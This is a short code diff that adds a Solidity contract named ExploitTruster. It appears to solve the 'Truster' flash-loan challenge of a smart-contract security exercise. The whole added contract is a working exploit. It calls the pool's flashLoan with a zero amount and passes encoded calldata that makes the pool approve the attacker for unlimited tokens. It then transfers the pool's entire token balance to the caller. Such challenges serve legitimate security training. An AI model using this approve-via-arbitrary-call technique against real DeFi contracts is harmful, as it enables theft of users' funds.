@@ -40,3 +40,28 @@ contract TrusterLenderPool is ReentrancyGuard {
     }
 
 }
+
+contract ExploitTruster {
+    IERC20 public immutable token;
+    TrusterLenderPool public immutable pool;
+    uint256 constant public MAX_INT_NUMBER = 
+    115792089237316195423570985008687907853269984665640564039457584007913129639935;
+
+    constructor (address _pool, address _token) {
+        pool = TrusterLenderPool(_pool);
+        token = IERC20(_token);
+    }
+
+    function drainFundsFromPool () public {
+
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)", address(this), MAX_INT_NUMBER
+        );
+        //Call the flashloan() function with borrowAmount set to 0
+        pool.flashLoan(0, msg.sender, address(token), data);
+
+        //once the ExploitTrsuter contract address has approval of the tokens
+        //transfer all the tokens to the EOA who calls the function
+        token.transferFrom(address(pool) , msg.sender, token.balanceOf(address(pool)));
+    }
+}
